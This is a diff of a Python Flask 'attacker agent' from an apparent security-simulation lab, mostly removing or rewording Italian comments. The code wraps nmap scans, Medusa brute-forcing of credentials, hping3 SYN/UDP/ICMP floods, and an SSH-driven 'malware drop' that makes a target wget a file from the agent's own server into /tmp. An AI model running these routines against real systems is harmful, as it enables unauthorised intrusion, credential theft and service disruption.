@@ -1,12 +1,11 @@
-# security-sim-project/scripts/attacker_agent.py
 from flask import Flask, request, jsonify
 import subprocess
 import threading
 import os
 import time
-import paramiko # Richiede 'paramiko'
-import random # Per simulazioni
-import json # Per convertire il dizionario in stringa per debug
+import paramiko 
+import random 
+import json
 import http.server
 import socketserver
 import socket
@@ -14,29 +13,24 @@ import socket
 
 app = Flask(__name__)
 
-# Lista per memorizzare i risultati degli attacchi completati
-# Sarà poi esposta tramite un endpoint per l'Orchestrator
+# Variabili globali per la gestione dei risultati
 completed_attack_results = []
 results_lock = threading.Lock() # Lock per la thread-safety
 
-# Funzioni per gli attacchi (restituiscono DIZIONARI Python, non jsonify)
 def run_nmap_scan(target_ip, scan_type, ports):
     """Esegue una scansione Nmap."""
     print(f"Esecuzione Nmap {scan_type} su {target_ip} porte {ports}")
     try:
-        # Usiamo sudo per permettere scansioni raw come -sS
-        # Assicurati che 'sudo' non chieda password o che l'utente che esegue l'agente abbia i permessi sudo per nmap
-        # Alternativa: chmod +s /usr/bin/nmap (meno sicuro ma evita sudo)
-        result = subprocess.run(['sudo','nmap', scan_type, '-p', ports, target_ip], capture_output=True, text=True, check=True, timeout=300) # Aggiunto timeout
+        result = subprocess.run(['sudo','nmap', scan_type, '-p', ports, target_ip], capture_output=True, text=True, check=True, timeout=300)
         print("Nmap Scan Output:\n", result.stdout)
-        return { # RESTITUISCE DIZIONARIO
+        return { 
             "status": "success",
             "message": "Nmap eseguito con successo.",
-            "output": result.stdout # Includi l'output standard
+            "output": result.stdout
         }
     except subprocess.CalledProcessError as e:
         print(f"Nmap Error: {e.stderr}")
-        return {"status": "error", "message": f"Nmap failed: {e.stderr}", "output": e.stdout} # Includi output anche in caso di errore
+        return {"status": "error", "message": f"Nmap failed: {e.stderr}", "output": e.stdout}
     except subprocess.TimeoutExpired:
         return {"status": "error", "message": "Nmap execution timed out.", "output": "Timeout expired."}
     except FileNotFoundError:
@@ -63,22 +57,20 @@ def run_medusa_bruteforce(target_ip, service, username_list, password_list, targ
 
         medusa_command = ['sudo', 'medusa', '-h', target_ip, '-U', user_file, '-P', pass_file, '-M', service]
         
-        if target_port: # Aggiungi la porta se specificata
+        if target_port:
             medusa_command.extend(['-p', str(target_port)])
 
         print(f"Comando Medusa: {' '.join(medusa_command)}")
         
-        result = subprocess.run(medusa_command, capture_output=True, text=True, check=True, timeout=300) # Aumentato timeout
+        result = subprocess.run(medusa_command, capture_output=True, text=True, check=True, timeout=300)
         
         output = result.stdout
         error = result.stderr
 
-        # Semplice parsing dell'output per trovare le credenziali
         found_credentials = []
-        if "SUCCESS" in output.upper(): # Medusa stampa "SUCCESS" in maiuscolo
+        if "SUCCESS" in output.upper():
             for line in output.splitlines():
                 if "SUCCESS" in line and "User:" in line and "Password:" in line:
-                    # Esempio di riga di successo: "SUCCESS (User: root, Password: toor)"
                     parts = line.split(',')
                     user = parts[0].split(':')[1].strip() if len(parts) > 0 else "N/A"
                     passwd = parts[1].split(':')[1].strip() if len(parts) > 1 else "N/A"
@@ -121,19 +113,21 @@ def start_malware_server():
     """Avvia un server HTTP semplice per servire il file di simulazione."""
     global malware_server_process, malware_server_port, malware_file_name, malware_file_content, local_malware_server_ip
 
-    # Crea il file di simulazione
+    # Creazione del file di simulazione
     with open(malware_file_name, "w") as f:
         f.write(malware_file_content)
 
-    # Determina l'IP locale dell'host (Attacker Agent VM)
+    # Determinazione dell'IP locale dell'host (Attacker Agent VM)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80)) # Connettiti a un IP esterno per ottenere l'IP della NIC attiva
+        s.connect(("8.8.8.8", 80)) # Connessione a un IP esterno per ottenere l'IP della NIC attiva
         local_ip = s.getsockname()[0]
         s.close()
         local_malware_server_ip = local_ip # Memorizza l'IP determinato
     except Exception:
-        local_malware_server_ip = "127.0.0.1" # Fallback se non riesce a determinare l'IP
+        # Fallback se non riesce a determinare l'IP
+        # è l'opzione che useremo per far partire il nostro httpserver in locale
+        local_malware_server_ip = "127.0.0.1"
 
     print(f"Starting simulated malware server on {local_malware_server_ip}:{malware_server_port} serving {malware_file_name}")
 
@@ -143,7 +137,6 @@ def start_malware_server():
     # Avvia il server in un thread separato
     def _run_server():
         try:
-            # Cambia la directory di lavoro per servire il file dalla posizione corrente
             os.chdir(os.path.dirname(os.path.abspath(__file__)))
             httpd.serve_forever()
         except Exception as e:
@@ -151,10 +144,10 @@ def start_malware_server():
         finally:
             print("Malware server stopped.")
 
-    malware_server_process = threading.Thread(target=_run_server, daemon=True) # Daemon per terminare con l'app
+    malware_server_process = threading.Thread(target=_run_server, daemon=True)
     malware_server_process.start()
     
-    # Restituisce l'URL completo del malware
+    # Restituire l'URL completo del malware
     return f"http://{local_malware_server_ip}:{malware_server_port}/{malware_file_name}"
 
 def stop_malware_server():
@@ -162,10 +155,8 @@ def stop_malware_server():
     global malware_server_process
     if malware_server_process and malware_server_process.is_alive():
         print("Stopping simulated malware server...")
-        # In un'applicazione reale, useresti httpd.shutdown() e httpd.server_close()
-        # Per questo SimpleHTTPServer avviato in un thread daemon, si affida alla terminazione del processo padre.
-        pass 
-    # Pulisci il file di simulazione
+        pass
+    # Rimozione del file di simulazione 
     if os.path.exists(malware_file_name):
         os.remove(malware_file_name)
 
@@ -203,18 +194,14 @@ def simulate_malware_drop(target_ip, malware_url=None, ssh_username=None, ssh_pa
     """
     global malware_server_process, malware_server_port, malware_file_name, local_malware_server_ip
 
-    # Avvia il server HTTP solo se non è già in esecuzione
+    # Avviamento del server HTTP solo se non è già in esecuzione
     if not malware_server_process or not malware_server_process.is_alive():
         actual_malware_url = start_malware_server()
-        # Diamo un attimo al server per avviarsi
         time.sleep(1)
     else:
-        # Se il server è già in esecuzione, ricaviamo l'URL attuale
-        # Assicurati che local_malware_server_ip sia già stato determinato da start_malware_server
         if local_malware_server_ip:
             actual_malware_url = f"http://{local_malware_server_ip}:{malware_server_port}/{malware_file_name}"
         else:
-            # Fallback se l'IP non è stato determinato in precedenza (dovrebbe esserlo)
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.connect(("8.8.8.8", 80))
@@ -227,15 +214,15 @@ def simulate_malware_drop(target_ip, malware_url=None, ssh_username=None, ssh_pa
 
     print(f"Simulazione di malware drop su {target_ip} scaricando da {actual_malware_url}")
 
-    # Comando per scaricare il file dalla VM target (richiede wget o curl)
+    # Comando per scaricare il file dalla VM target
     download_command = f"wget -q -O /tmp/{malware_file_name} {actual_malware_url}"
     
     try:
-        # Verifica se le credenziali SSH sono state fornite
+        # Verifica delle credenziali SSH sono state fornite
         if not ssh_username or not ssh_password:
             return {"status": "error", "message": "Credenziali SSH (username e password) sono richieste per il malware drop.", "output": ""}
 
-        # Utilizza simulate_lateral_movement_ssh per eseguire il comando di download
+        # Si utilizza simulate_lateral_movement_ssh per eseguire il comando di download
         ssh_result = simulate_lateral_movement_ssh(target_ip, ssh_username, ssh_password, download_command)
         
         status = ssh_result.get("status", "error")
@@ -244,16 +231,16 @@ def simulate_malware_drop(target_ip, malware_url=None, ssh_username=None, ssh_pa
 
         if status == "success":
             message = f"Malware drop simulato (download riuscito) su {target_ip}. File scaricato in /tmp/{malware_file_name}."
-            # Aggiungi un comando per verificare l'esistenza del file sul target
+            # Aggiunta del comando per verificare l'esistenza del file sul target
             verify_command = f"ls -la /tmp/{malware_file_name}"
             verify_result = simulate_lateral_movement_ssh(target_ip, ssh_username, ssh_password, verify_command)
             if verify_result.get("status") == "success" and malware_file_name in verify_result.get("output", ""):
                 output += "\nVerifica: File trovato sul target."
             else:
                 output += "\nVerifica: File NON trovato o errore nella verifica sul target."
-                status = "warning" # Il download sembra riuscito, ma la verifica fallisce
+                status = "warning"
         else:
-            message = f"Malware drop fallito: {message}" # Propaga il messaggio di errore SSH
+            message = f"Malware drop fallito: {message}"
 
         return {"status": status, "message": message, "output": output}
 
@@ -277,14 +264,13 @@ def run_dos_ip_flood(target_ip, target_port, duration_seconds, flood_type):
         hping3_command.extend(['-S', '-p', str(target_port)])
     elif flood_type == 'UDP':
         hping3_command.extend(['-2', '-p', str(target_port)])
-    elif flood_type == 'ICMP': # Aggiungiamo anche ICMP come opzione
-        hping3_command.extend(['-1']) # -1 è per ICMP Echo Request (ping)
+    elif flood_type == 'ICMP':
+        hping3_command.extend(['-1'])
     else:
         return {"status": "error", "message": "Tipo di flood non supportato. Usare 'SYN', 'UDP' o 'ICMP'.", "output": ""}
 
     print(f"Comando hping3: {' '.join(hping3_command)}")
 
-    # hping3 in un processo separato
     process = None
     try:
         process = subprocess.Popen(hping3_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -304,7 +290,7 @@ def run_dos_ip_flood(target_ip, target_port, duration_seconds, flood_type):
         if stderr:
             print(f"hping3 stderr:\n{stderr}")
 
-        if process.returncode == 0 or process.returncode is None: # hping3 con flood spesso ritorna un codice non 0, o None se terminato
+        if process.returncode == 0 or process.returncode is None:
             return {
                 "status": "success",
                 "message": f"DoS IP Flood ({flood_type}) completato su {target_ip}:{target_port}.",
@@ -322,7 +308,7 @@ def run_dos_ip_flood(target_ip, target_port, duration_seconds, flood_type):
         print(f"Errore durante l'esecuzione di DoS IP Flood con hping3: {e}")
         return {"status": "error", "message": f"Errore durante DoS IP Flood: {str(e)}", "output": ""}
     finally:
-        if process and process.poll() is None: # Assicurati che il processo sia terminato
+        if process and process.poll() is None:
             process.terminate()
             try:
                 process.wait(timeout=5)
@@ -343,7 +329,7 @@ def run_attack_wrapper(attack_type, target_ip, attack_func, *func_args):
             "timestamp": time.time(),
             "attack_type": attack_type,
             "target_ip": target_ip,
-            "status": "failed", # Default a failed in caso di errore non gestito
+            "status": "failed", # Default status
             "message": "Errore interno nell'agente di attacco.",
             "output": ""
         }
@@ -351,7 +337,7 @@ def run_attack_wrapper(attack_type, target_ip, attack_func, *func_args):
             # Esegue la funzione di attacco, che ora restituisce un dizionario
             attack_output = attack_func(*func_args)
             
-            # Unisci i risultati specifici dell'attacco con le info di base
+            # Unire i risultati specifici dell'attacco con le info di base
             full_result.update(attack_output)
             print(f"Attack '{attack_type}' on {target_ip} completed. Result: {json.dumps(full_result)}")
             
@@ -441,8 +427,6 @@ def handle_attack():
 def get_attack_results():
     global completed_attack_results, results_lock
     with results_lock:
-        # Restituisce i risultati e svuota la lista per evitare duplicati al prossimo polling
-        # Se preferisci che l'orchestrator gestisca i duplicati, rimuovi .clear()
         current_results = list(completed_attack_results)
         completed_attack_results = [] # Svuota la lista dopo averla inviata
     return jsonify({"status": "success", "results": current_results})
@@ -452,5 +436,4 @@ def get_status():
     return jsonify({"status": "Attacker Agent running", "timestamp": time.time()})
 
 if __name__ == '__main__':
-    # Agente attaccante sulla porta 5001, accessibile solo da localhost (orchestrator)
-    app.run(host='127.0.0.1', port=5001, debug=True) # Abilitato debug per vedere errori in console
+    app.run(host='127.0.0.1', port=5001, debug=True)
